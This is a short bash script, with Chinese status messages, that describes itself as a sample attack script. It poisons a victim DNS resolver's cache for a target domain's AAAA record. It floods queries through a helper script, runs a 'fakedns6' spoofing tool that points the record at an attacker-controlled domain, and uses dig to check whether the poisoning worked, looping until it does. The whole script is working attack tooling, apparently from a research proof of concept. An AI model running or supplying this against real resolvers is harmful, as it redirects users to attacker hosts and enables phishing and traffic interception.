# This is a sample attack script and may not work properly. Please adjust the parameter accordingly.
# $1 for victim resolver IP, $2 for attacker-controlled domain, $3 for iface name, $4 for victim domain name, $5 for victim domain nameserver IP
# Please run with sudo.

# Verify the existing record domain, just for proof purposes.
echo '原记录:'
dig @$1 $4 AAAA


success=0
while $success!=1
do
  success=0
  echo '10秒之后开始攻击...'
  sleep 10
  echo "开始攻击"
  # flood
  success=$(bash ./dns_query.sh $5 `echo $1` 789 `echo $4 | sed "s/\./ /g"`)
  # Start attack
  # Change the argument accordingly
  time ./fakedns6 -a $5 -b $1 -i $3 -n $4 -r $1 -t 50000 -at $2 -tg 0 -s 10000 -e 65000 -j 0
  # Validations
  echo '攻击之后'
  dig @$1 $4 AAAA
  echo '如果结果未改变, 需要等待原缓存过期. 或者按 Ctrl-C取消攻击.'
  echo "等待缓存过期"
done
# success
echo '检测到攻击成功实现'
echo '等待两秒，再次请求...'
sleep 2
dig @$1 $4 AAAA
echo '攻击已完成！！！！'
